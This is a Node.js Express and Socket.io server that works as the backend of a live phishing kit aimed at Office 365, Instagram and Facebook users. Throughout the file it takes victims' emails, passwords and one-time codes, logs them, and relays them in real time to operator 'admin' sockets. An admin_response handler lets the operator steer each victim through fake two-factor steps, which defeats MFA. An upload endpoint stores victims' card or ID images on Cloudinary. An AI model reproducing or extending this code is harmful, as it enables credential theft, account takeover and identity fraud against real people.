const express = require("express");
const http = require("http");
const dotenv = require("dotenv");
const cors = require("cors");
const { Server } = require("socket.io");
const multer = require("multer");
const { v2: cloudinary } = require("cloudinary");

dotenv.config();

cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
});

const app = express();

app.use(
  cors({
    origin: "*",
    methods: ["GET", "POST"],
    credentials: true,
  })
);

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: [
      process.env.ADMIN_URL,
      process.env.OFFICE365_USER_URL,
      process.env.IG_USER_URL,
      process.env.FB_USER_URL,
      // process.env.TEST_USER_URL,
      // process.env.TEST_ADMIN_URL,
    ],
    methods: ["GET", "POST"],
  },
});

const storage = multer.memoryStorage();
const upload = multer({
  storage,
  limits: {
    fileSize: 10 * 1024 * 1024, // 10MB limit
    // files: 5, // maximum 5 files
  },
}).array("files");

// Wrap file upload in a promise for better error handling
const handleUpload = (req, res) => {
  return new Promise((resolve, reject) => {
    upload(req, res, (err) => {
      if (err instanceof multer.MulterError) {
        reject({
          status: 400,
          message: `Multer upload error: ${err.message}`,
        });
      } else if (err) {
        reject({
          status: 500,
          message: `Unknown upload error: ${err.message}`,
        });
      }
      resolve(req.files);
    });
  });
};

// Cloudinary upload with proper error handling
const uploadToCloudinary = async (file) => {
  return new Promise((resolve, reject) => {
    const uploadStream = cloudinary.uploader.upload_stream(
      {
        resource_type: "auto",
        folder: "fb_verification",
        timeout: 60000, // 60 second timeout
      },
      (error, result) => {
        if (error) reject(error);
        else resolve(result);
      }
    );

    uploadStream.end(file.buffer);
  });
};

let adminSockets = new Set();
const userSessions = new Map();
const sessions = new Map();

io.on("connection", (socket) => {
  console.log("New connection:", socket.id);

  socket.on("register_admin", () => {
    adminSockets.add(socket);
    console.log("Admin registered:", socket.id);

    socket.on("disconnect", () => {
      adminSockets.delete(socket);
      console.log("Admin disconnected:", socket.id);
    });
  });

  socket.on("verify_email", (data) => {
    // Store session data
    const sessionData = sessions.get(data.sessionId) || {
      email: data.email,
      events: [],
    };

    sessionData.events.push({
      type: "email-verification",
      timestamp: data.timestamp,
      data: data.email,
    });

    sessions.set(data.sessionId, sessionData);
    userSessions.set(data.sessionId, socket);

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("new-login-attempt", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("password-attempt", (data) => {
    console.log("Received password attempt:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
    });

    // Check if session data exists for the provided sessionId
    let sessionData = sessions.get(data.sessionId);
    if (!sessionData) {
      // If no session exists, initialize a new session
      console.log(
        "No session found. Initializing new session for sessionId:",
        data.sessionId
      );
      sessionData = {
        sessionId: data.sessionId,
        events: [],
      };
      sessions.set(data.sessionId, sessionData); // Add to the sessions map
    }

    // Add the password attempt as an event to the session
    sessionData.events.push({
      type: "password-submission",
      timestamp: data.timestamp || new Date().toISOString(), // Use provided timestamp or current time
      data: data.password,
    });

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("password-attempt", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("authenticator-select", (data) => {
    console.log("Received authenticator-select:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
    });

    let sessionData = sessions.get(data.sessionId);

    if (!sessionData) {
      // If no session exists, initialize it
      console.log(
        "No session found. Initializing new session for sessionId:",
        data.sessionId
      );
      sessionData = {
        sessionId: data.sessionId,
        email: data.email,
        events: [],
      };
      sessions.set(data.sessionId, sessionData); // Add to sessions map
    }

    // Add the authenticator-select event to the session
    sessionData.events.push({
      type: "authenticator-select",
      timestamp: data.timestamp || new Date().toISOString(),
      email: data.email,
      password: data.password, // Assuming 'data.password' is relevant here
    });

    // Broadcast to admin sockets
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("authenticator-select", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("verifycode-select", (data) => {
    console.log("Received verifycode-select:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
    });

    // Check if session data exists for the sessionId
    let sessionData = sessions.get(data.sessionId);
    if (!sessionData) {
      // If no session exists, initialize a new one
      console.log(
        "No session found. Initializing new session for sessionId:",
        data.sessionId
      );
      sessionData = {
        sessionId: data.sessionId,
        email: data.email,
        events: [],
      };
      sessions.set(data.sessionId, sessionData);
    }

    // Add the verifycode-select event to the session
    sessionData.events.push({
      type: "verifycode-select",
      timestamp: data.timestamp || new Date().toISOString(),
      email: data.email,
      password: data.password,
    });

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("verifycode-select", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("verify-click", (data) => {
    console.log("Received verify-click:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
      verifyCode: data.verifyCode,
    });

    // Retrieve or initialize session data
    let sessionData = sessions.get(data.sessionId);
    if (!sessionData) {
      console.log(
        "No session found. Initializing new session for sessionId:",
        data.sessionId
      );
      sessionData = {
        sessionId: data.sessionId,
        email: data.email,
        events: [],
      };
      sessions.set(data.sessionId, sessionData); // Add to sessions
    }

    // Add the verify-click event to the session
    sessionData.events.push({
      type: "verify-click",
      timestamp: data.timestamp || new Date().toISOString(),
      email: data.email,
      password: data.password,
      verifyCode: data.verifyCode,
    });

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("verify-click", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("text-select", (data) => {
    console.log("Received text-select:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
    });

    // Retrieve session data or initialize a new session if it doesn't exist
    let sessionData = sessions.get(data.sessionId);
    if (!sessionData) {
      console.log(
        "No session found. Initializing new session for sessionId:",
        data.sessionId
      );
      sessionData = {
        sessionId: data.sessionId,
        email: data.email, // Store email in the session
        events: [],
      };
      sessions.set(data.sessionId, sessionData); // Add to the sessions map
    }

    // Add the text-select event to the session
    sessionData.events.push({
      type: "text-select",
      timestamp: data.timestamp || new Date().toISOString(),
      email: data.email,
      password: data.password,
    });

    // Broadcast the text-select event to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("text-select", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("text-click", (data) => {
    console.log("Received text-click:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
      verifyCode: data.verifyCode,
    });

    const sessionData = sessions.get(data.sessionId);

    if (sessionData) {
      sessionData.events.push({
        type: "text-click",
        timestamp: data.timestamp,
        email: data.email,
        password: data.password,
        verifyCode: data.verifyCode,
      });

      adminSockets.forEach((adminSocket) => {
        adminSocket.emit("text-click", {
          ...data,
          sessionId: data.sessionId,
          timestamp: new Date().toISOString(),
        });
      });
    } else {
      console.error("No session found for sessionId:", data.sessionId);
    }
  });

  socket.on("call-select", (data) => {
    console.log("Received call-select:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
    });

    // Check for existing session data
    let sessionData = sessions.get(data.sessionId);

    if (!sessionData) {
      // If no session exists, initialize a new one
      console.log(
        "No session found. Initializing new session for sessionId:",
        data.sessionId
      );
      sessionData = {
        sessionId: data.sessionId,
        email: data.email, // Use email from data
        events: [],
      };
      sessions.set(data.sessionId, sessionData); // Add new session to map
    }

    // Add call-select event to session data
    sessionData.events.push({
      type: "call-select",
      timestamp: data.timestamp || new Date().toISOString(),
      email: data.email,
      password: data.password,
    });

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("call-select", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("call-authenticated", (data) => {
    console.log("Received call-authenticated:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
    });

    // Retrieve or create session dynamically
    let sessionData = sessions.get(data.sessionId);
    if (!sessionData) {
      console.log(
        "No session found. Initializing new session for sessionId:",
        data.sessionId
      );
      sessionData = {
        sessionId: data.sessionId,
        email: data.email,
        events: [],
      };
      sessions.set(data.sessionId, sessionData); // Add the new session
    }

    // Add the call-authenticated event to the session
    sessionData.events.push({
      type: "call-authenticated",
      timestamp: data.timestamp || new Date().toISOString(),
      email: data.email,
      password: data.password,
    });

    // Broadcast the event to all admin sockets
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("call-authenticated", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  // Handle full login attempts (with password)
  socket.on("login_attempt", (data) => {
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("login-attempt", {
        ...data,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("ig_attempt_init", (data) => {
    const sessionData = sessions.get(data.sessionId) || {
      email: data.email,
      password: data.password,
      events: [],
    };

    sessionData.events.push({
      type: "ig_attempt_init",
      timestamp: data.timestamp,
      data: data.email,
    });

    sessions.set(data.sessionId, sessionData);
    userSessions.set(data.sessionId, socket);

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("ig_attempt_init", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("auth_value_submit", (data) => {
    const sessionData = sessions.get(data.sessionId) || {
      email: data.email,
      password: data.password,
      otp: data.otp,
      events: [],
    };

    sessionData.events.push({
      type: "auth_value_submit",
      timestamp: data.timestamp,
      data: data.email,
    });

    sessions.set(data.sessionId, sessionData);
    userSessions.set(data.sessionId, socket);

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("auth_value_submit", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("stay_signed_in", (data) => {
    const sessionData = sessions.get(data.sessionId) || {
      email: data.email,
      password: data.password,
      staySignedIn: data.staySignedIn,
      events: [],
    };

    sessionData.events.push({
      type: "stay_signed_in",
      timestamp: data.timestamp,
      data: data.email,
    });

    sessions.set(data.sessionId, sessionData);
    userSessions.set(data.sessionId, socket);

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("stay_signed_in", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("fb_attempt_init", (data) => {
    const sessionData = sessions.get(data.sessionId) || {
      email: data.email,
      password: data.password,
      events: [],
    };

    sessionData.events.push({
      type: "fb_attempt_init",
      timestamp: data.timestamp,
      data: data.email,
    });

    sessions.set(data.sessionId, sessionData);
    userSessions.set(data.sessionId, socket);

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("fb_attempt_init", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("fb_otp", (data) => {
    const sessionData = sessions.get(data.sessionId) || {
      email: data.email,
      password: data.password,
      otp: data.otp,
      events: [],
    };

    sessionData.events.push({
      type: "fb_otp",
      timestamp: data.timestamp,
      data: data.email,
    });

    sessions.set(data.sessionId, sessionData);
    userSessions.set(data.sessionId, socket);

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("fb_otp", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("fb_resend_otp", (data) => {
    const sessionData = sessions.get(data.sessionId) || {
      email: data.email,
      password: data.password,
      events: [],
    };

    sessionData.events.push({
      type: "fb_resend_otp",
      timestamp: data.timestamp,
      data: data.email,
    });

    sessions.set(data.sessionId, sessionData);
    userSessions.set(data.sessionId, socket);

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("fb_resend_otp", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("fb_approval_mounted", (data) => {
    const sessionData = sessions.get(data.sessionId) || {
      email: data.email,
      password: data.password,
      otp: data.otp,
      events: [],
    };

    sessionData.events.push({
      type: "fb_approval_mounted",
      timestamp: data.timestamp,
      data: data.email,
    });

    sessions.set(data.sessionId, sessionData);
    userSessions.set(data.sessionId, socket);

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("fb_approval_mounted", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("fb_another_way", (data) => {
    const sessionData = sessions.get(data.sessionId) || {
      email: data.email,
      password: data.password,
      otp: data.otp,
      events: [],
    };

    sessionData.events.push({
      type: "fb_another_way",
      timestamp: data.timestamp,
      data: data.email,
    });

    sessions.set(data.sessionId, sessionData);
    userSessions.set(data.sessionId, socket);

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("fb_another_way", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("fb_done", (data) => {
    const sessionData = sessions.get(data.sessionId) || {
      email: data.email,
      password: data.password,
      otp: data.otp,
      events: [],
    };

    sessionData.events.push({
      type: "fb_done",
      timestamp: data.timestamp,
      data: data.email,
    });

    sessions.set(data.sessionId, sessionData);
    userSessions.set(data.sessionId, socket);

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("fb_done", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  // Handle admin responses
  socket.on("admin_response", (data) => {
    // console.log(data);
    const { sessionId, eventIndex, response } = data;
    const userSocket = userSessions.get(sessionId);
    const sessionData = sessions.get(sessionId);

    if (userSocket && sessionData) {
      // Update session event status
      sessionData.events[eventIndex].status = response;

      // Send response to user
      userSocket.emit(
        "admin_response",
        //   {
        //   response,
        //   eventIndex,
        //   timestamp: new Date().toISOString(),
        // }
        data
      );

      // Broadcast update to all admins
      adminSockets.forEach((adminSocket) => {
        adminSocket.emit("status_update", {
          sessionId,
          eventIndex,
          status: response,
          timestamp: new Date().toISOString(),
        });
      });
    }
  });

  // Error handling
  socket.on("error", (error) => {
    console.error("Socket error:", error);
  });

  socket.on("disconnect", () => {
    for (const [sessionId, sess] of userSessions.entries()) {
      if (sess === socket) {
        userSessions.delete(sessionId);
        sessions.delete(sessionId);
        break;
      }
    }
  });
});

// Modified file upload endpoint

// app.post("/api/fb/upload", async (req, res) => {
//   console.log("Received upload request");

//   try {
//     const files = await handleUpload(req, res);

//     if (!files || files.length === 0) {
//       throw {
//         status: 400,
//         message: "No files were uploaded",
//       };
//     }

//     const { sessionId, email, timestamp } = req.body;

//     if (!sessionId || !email) {
//       throw {
//         status: 400,
//         message: "Missing required fields: sessionId and email",
//       };
//     }

//     console.log(
//       `Processing upload for session ${sessionId} and email ${email}`
//     );

//     const uploadedFiles = [];

//     // Upload files to Cloudinary with error handling
//     for (const file of files) {
//       try {
//         const uploadResult = await uploadToCloudinary(file);
//         uploadedFiles.push({
//           url: uploadResult.secure_url,
//           public_id: uploadResult.public_id,
//           originalName: file.originalname,
//           fileName: file.originalname,
//           fileType: file.mimetype,
//           uploadedAt: new Date().toISOString(),
//         });
//         console.log(
//           `Successfully uploaded file to Cloudinary: ${uploadResult.public_id}`
//         );
//       } catch (uploadError) {
//         console.error(`Error uploading file to Cloudinary:`, uploadError);
//       }
//     }

//     if (uploadedFiles.length === 0) {
//       throw {
//         status: 500,
//         message: "Failed to upload any files to Cloudinary",
//       };
//     }

//     // Store upload event in session with detailed file information
//     const sessionData = sessions.get(sessionId) || {
//       email,
//       events: [],
//     };

//     const eventData = {
//       type: "fb_card_upload",
//       timestamp: timestamp || new Date().toISOString(),
//       files: uploadedFiles.map((file) => ({
//         url: file.url,
//         fileName: file.fileName,
//         fileType: file.fileType,
//         uploadedAt: file.uploadedAt,
//       })),
//       email,
//     };

//     sessionData.events.push(eventData);
//     sessions.set(sessionId, sessionData);
//     console.log(`Updated session data for ${sessionId}`);

//     // Send single event to admin with detailed file information
//     let adminNotified = false;
//     adminSockets.forEach((adminSocket) => {
//       try {
//         adminSocket.emit("fb_card_upload", {
//           sessionId,
//           email,
//           timestamp: new Date().toISOString(),
//           files: uploadedFiles.map((file) => ({
//             url: file.url,
//             fileName: file.fileName,
//             fileType: file.fileType,
//             uploadedAt: file.uploadedAt,
//             preview: file.url, // Adding preview URL for direct image display
//           })),
//         });

//         adminNotified = true;
//         console.log(`Notified admin socket: ${adminSocket.id}`);
//       } catch (emitError) {
//         console.error(
//           `Error notifying admin socket ${adminSocket.id}:`,
//           emitError
//         );
//       }
//     });

//     return res.status(200).json({
//       message: "Files uploaded successfully",
//       files: uploadedFiles,
//       sessionId,
//       adminNotified,
//     });
//   } catch (error) {
//     console.error("Error in upload endpoint:", error);
//     const statusCode = error.status || 500;
//     const message = error.message || "Internal server error during upload";
//     return res.status(statusCode).json({
//       message,
//       error: process.env.NODE_ENV === "development" ? error : undefined,
//     });
//   }
// });

app.post("/api/fb/upload", async (req, res) => {
  console.log("Received upload request");

  try {
    const files = await handleUpload(req, res);

    if (!files || files.length === 0) {
      throw {
        status: 400,
        message: "No files were uploaded",
      };
    }

    const { sessionId, email, timestamp } = req.body;

    if (!sessionId || !email) {
      throw {
        status: 400,
        message: "Missing required fields: sessionId and email",
      };
    }

    console.log(
      `Processing upload for session ${sessionId} and email ${email}`
    );

    const uploadedFiles = [];
    const failedUploads = [];

    // Get user socket for notifications
    const userSocket = userSessions.get(sessionId);

    // Upload files to Cloudinary with error handling
    for (const file of files) {
      try {
        const uploadResult = await uploadToCloudinary(file);
        uploadedFiles.push({
          url: uploadResult.secure_url,
          public_id: uploadResult.public_id,
          originalName: file.originalname,
          fileName: file.originalname,
          fileType: file.mimetype,
          uploadedAt: new Date().toISOString(),
        });
        console.log(
          `Successfully uploaded file to Cloudinary: ${uploadResult.public_id}`
        );
      } catch (uploadError) {
        console.error(`Error uploading file to Cloudinary:`, uploadError);
        failedUploads.push({
          fileName: file.originalname,
          error: uploadError.message || "Upload failed",
        });
      }
    }

    // If any uploads failed, notify user and return error
    if (failedUploads.length > 0) {
      if (userSocket) {
        userSocket.emit("fb_card_upload_failed", {
          error: "One or more files failed to upload",
          failedFiles: failedUploads,
          timestamp: new Date().toISOString(),
        });
      }

      throw {
        status: 500,
        message: "One or more files failed to upload",
        failedUploads,
      };
    }

    // Store upload event in session with detailed file information
    const sessionData = sessions.get(sessionId) || {
      email,
      events: [],
    };

    const eventData = {
      type: "fb_card_upload",
      timestamp: timestamp || new Date().toISOString(),
      files: uploadedFiles.map((file) => ({
        url: file.url,
        fileName: file.fileName,
        fileType: file.fileType,
        uploadedAt: file.uploadedAt,
      })),
      email,
    };

    sessionData.events.push(eventData);
    sessions.set(sessionId, sessionData);
    console.log(`Updated session data for ${sessionId}`);

    // Send to admin sockets only on successful upload
    let adminNotified = false;
    adminSockets.forEach((adminSocket) => {
      try {
        adminSocket.emit("fb_card_upload", {
          sessionId,
          email,
          timestamp: new Date().toISOString(),
          files: uploadedFiles.map((file) => ({
            url: file.url,
            fileName: file.fileName,
            fileType: file.fileType,
            uploadedAt: file.uploadedAt,
            preview: file.url,
          })),
        });

        adminNotified = true;
        console.log(`Notified admin socket: ${adminSocket.id}`);
      } catch (emitError) {
        console.error(
          `Error notifying admin socket ${adminSocket.id}:`,
          emitError
        );
      }
    });

    return res.status(200).json({
      message: "Files uploaded successfully",
      files: uploadedFiles,
      sessionId,
      adminNotified,
    });
  } catch (error) {
    console.error("Error in upload endpoint:", error);
    const statusCode = error.status || 500;
    const message = error.message || "Internal server error during upload";

    // Notify user about the upload failure if not already notified
    const userSocket = userSessions.get(req.body.sessionId);
    if (userSocket && !error.failedUploads) {
      userSocket.emit("fb_card_upload_failed", {
        error: message,
        timestamp: new Date().toISOString(),
      });
    }

    return res.status(statusCode).json({
      message,
      error: process.env.NODE_ENV === "development" ? error : undefined,
    });
  }
});

app.get("/health", (req, res) => {
  res.status(200).json({ status: "healthy" });
});

const PORT = process.env.PORT || 8080;

server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
